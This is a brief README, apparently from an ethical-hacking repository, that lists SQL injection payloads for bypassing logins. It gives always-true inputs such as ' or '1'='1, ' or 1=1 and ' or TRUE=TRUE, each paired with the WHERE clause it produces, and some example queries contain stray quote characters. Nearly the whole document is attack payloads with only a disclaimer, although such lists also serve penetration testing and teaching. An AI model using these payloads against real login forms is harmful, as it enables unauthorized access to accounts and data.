# SQL INJECTION 
### PAYLOAD AND EXAMPLE QUERY

![https://img.shields.io/badge/ETHICAL%20HACKING-TRUE-red](https://img.shields.io/badge/ETHICAL%20HACKING-TRUE-red)

> ! Attention, This Repository For Ethical Hacking 

### 1. Bypass SQL Always True <a name="alwaystrue"></a>

Example of QUERY SQL starting from WHERE, please develop and analyze it yourself.

> Based on 1=1 is Always True 

|PAYLOAD  | EXAMPLE QUERY |
|--|--|
| ```' or '1'='1``` |```WHERE username = '' or '1'='1' AND password = '' or '1'='1';```|
| ```' or 1=1``` |```WHERE username = '' or 1=1 AND password = '' or 1=1" ;```|

> Based on Field Not Null is Always True

|PAYLOAD  | EXAMPLE QUERY |
|--|--|
| ```' or username!=''``` |```WHERE username = '' or username!='' AND password = '' or password!='';```|

> Based on FALSE Not TRUE is Always True

|PAYLOAD  | EXAMPLE QUERY |
|--|--|
| ```' or FALSE!=TRUE``` |```WHERE username = '' or FALSE!=TRUE AND password = '' or FALSE!=TRUE;```|

> Based on TRUE=TRUE is Always True

|PAYLOAD  | EXAMPLE QUERY |
|--|--|
| ```' or TRUE=TRUE``` |```WHERE username = '' or TRUE=TRUE AND password = '' or TRUE=TRUE";```|

